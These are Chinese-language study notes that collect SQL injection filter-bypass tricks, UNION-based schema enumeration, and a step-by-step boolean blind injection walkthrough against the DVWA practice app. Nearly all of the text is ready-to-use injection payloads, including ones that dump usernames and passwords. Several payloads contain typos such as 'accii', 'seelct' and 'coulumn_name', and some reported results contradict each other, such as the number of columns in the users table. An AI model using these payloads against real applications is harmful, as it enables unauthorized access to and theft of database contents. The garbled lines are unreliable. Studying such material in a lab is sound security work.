1. [sql注入绕过](#SQL注入绕过)
2. [联合注入](#手注)
3. [布尔盲注](#盲注)


# SQL注入绕过

0. 大小写混用

SeLect

1. Url编码

2. 16进制编码

3. distinct绕过

过滤union select 使用 union distinct select

4. select'1'绕过

过滤select空格，select后面的参数用引号包裹

例如: select'1'

5. 科学计数法绕过

过滤空格from，和from挨着的参数，使用科学计数法

例如：3e0from

6. {}绕过

过滤from空格，from{x 表名}

例如：3e0from{x user}

7. 过滤注释符号 / *  -  #

调整payload在适当位置加括号，可以不需要注释

8. 注释绕过

/*!select*/

9. 双写绕过

SEselectLECT

10. 符号绕过

过滤 or and xor not ，使用 && || |# |

11. 大小于号绕过

过滤 = 可以使用大小于号 <>

12. greatest绕过

过滤大小于号，使用greatest(n1,n2,nx)返回n中的最大值，使用least返回n中的最小值

13. strcmp绕过

strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()若根据当前分类次序，第一个参数小于第二个，则返回 -1,其它情况返回 1

# 手注
## 爆所有数据库
> group_concat(schema_name) from information_schema.schemata
> group_concat(schema_name) from information_schema.schemata
## 查看当前数据库数据库
>database()
## 爆表
> table_name from information_schema.tables  where table_schema=''
## 爆列名
> column_name from information_schema.columns where table_name=''
## 爆字段
> concat(列名) from 表名
## 爆所有字段
>group_concat(concat_ws(0x2d2d,username,password)) from 数据库.表名
## 组合显示
> group_concat(列名或者表名)
> concat_ws(列名,'',列名)    ---用来拼接用户名和密码
## 封闭
- --+
- '
- '#'去掉引号
# 盲注
## low
### 判断数据库长度
> 1' and length(database())=4--+
### ascii码判断第几位是多少
> 1' and ascii(substr(database(),1,1))=100#
#### 第一位是v
> 1' and ascii(substr(database(),2,1))=118#
#### 第二位是v，最后得到当前使用数据库名称为dvwa
### 猜解当前数据库有多少个表
> 1' and (select count(table_name) from information_schema.tables where table_schema=database())=2#
#### 当前数据库有两个表
> 1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9#
###  第一个表长度为9
> 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103#
#### 第一个表第一个字母为g
> 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117#
#### 第一个表第二个字母为u，最终guessbook
### 判断第二个表长度
> 1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5#
#### 第二个表长度为5
> 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=117#
#### 第二个表第一个字母为u
> 1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=115#
#### 第二个表第二个字母为s，最终users
### 判断有多少列
> 1’ and (select count(column_name)from information_schema.columns where table_name=‘users’)=8#
#### 有8列
> 1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=7#
#### 第一列长度为7
> 1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1))=4#
#### 第四列长度为3
> 1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1))=117#
#### 第四列第一位为u
> 1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),2))=115#
#### 第四列第二个为s，破解得到user
### 爆用户名字段
> 1’ and (select count(user)from users)=5#
#### 有五个用户名
> 1' and length(substr((select user from users limit 0,1),1))=5#
#### 第一个用户名长度为5
> 1’ and (ascii(substr((select user from users limit 0,1),1,1)))=97#
#### 第一个用户名第一个字符为a
> 1’ and (ascii(substr((select user from users limit 0,1),2,1)))=100#
#### 第一个用户名第二个字符为d,破解得admin
> 1' and length(substr((select user from users limit 1,1),1))>6#
#### 第二个用户名长度为6
> 1’ and (ascii(substr((select user from users limit 1,1),1,1)))=115#
#### 第二个用户名第一个字符为s
> 1’ and (ascii(substr((select user from users limit 1,1),2,1)))=109#
#### 第二个用户名第二个字符为m,破解得smithy
> 1' and length(substr((select user from users limit 3,1),1))=5#
#### 第四个用户名长度为5
> 1' and length(substr((select user from users limit 4,1),1))=6#
#### 第五个用户名长度为6
# 布尔盲注
## 判断数据库名称长度
> 1' and length(database())>10#
## 利用ASCII大小来判断第几位是什么
> 1' and ascii(substr(database(),1,1))=100#
## 猜解当前表的个数
> 1’ and (select count(table_name) from information_schema.tables where table_schema=database())=2 #
## 猜解表名
## l 表名称的长度
## 1.查询列出当前连接数据库下的所有表名称
> select table_name from information_schema.tables where table_schema=database()
## 2.列出当前连接数据库中的第1个表名称
> select table_name from information_schema.tables where table_schema=database() limit 0,1
## 3.以当前连接数据库第1个表的名称作为字符串，从该字符串的第一个字符开始截取其全部字符
> substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)
## 4.计算所截取当前连接数据库第1个表名称作为字符串的长度值
> length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))
## 5.将当前连接数据库第1个表名称长度与某个值比较作为判断条件，联合and逻辑构造特定的sql语句进行查询，根据查询返回结果猜解表名称的长度值
> 1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))>10 #
## 查询当前数据库表名的第一个表的第一个字母
> 1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103#
### 可以查询到表名第一个字母为g,ascii值为103
## 查询当前数据库的第二个表的第一个字母
> 1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))>88#
## 猜解数据
### 猜解有几列
> 1’ and (select count(column_name)from information_schema.columns where table_name=‘users’)=8#
## 猜解每列列名长度
### 第一列
> 1’ and length(substr((select coulumn_name from information_schema.columns where table_name=‘users’ limit 0,1),1))=7#
## 第四列长度为3
> 1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 3,1),1))=4#
## 猜解列名称
### 第一列第一位
> 1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=100#
## 第一列第二位
> 1’ and ascii(substr((select column_name from information_schema.columns where table_name=‘users’ limit 0,1),2))=97#
## 第二列第一位
> 1' and accii(substr((seelct column_name from information_schema.columns where table_name='users' limit 1,1),1))
## 猜解用户名
### 第一位
>1’ and (ascii(substr((select user from users limit 0,1),1,1)))=97#
为a
### 第二位
>1’ and (ascii(substr((select user from users limit 0,1),2,1)))=100 #
dvwa布尔盲注
当前使用数据库第一位ascii为100  d
第二位为118  v
第三位119  w
第四位97  a
1' and (select count(table_name) from information_schema.tables where table_schema=database())=2#
查询到当前数据库有两个表
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9#
当前数据库第一个表字符串长度为9
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=103#
当前数据库第一个表第一个字符ascii为103
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2))=117#
当前数据库第一个表第二个字符ascii为117
1' and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5#
当前数据库第二个表字符串长度为5
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=117#
当前数据库第二个表第一个字符ascii为117
1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2))=115#
当前数据库第二个表第二个字符ascii为115
1' and (select count(column_name) from information_schema.columns where table_name='users')=14#
users表有14列数据
1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=7#
第一列列名长度为7
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1))=117#
表第一列第一个字符ascii为117
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),3,1)) =101#
表第一列第三个字符ascii为101
1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1))=6#
第二列列名长度为6
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),1,1)) =102#
表第二列第一个字符为f
1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),3,1))=114#
表第二列第三个字符ascii为114
1' and length(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),3))=5#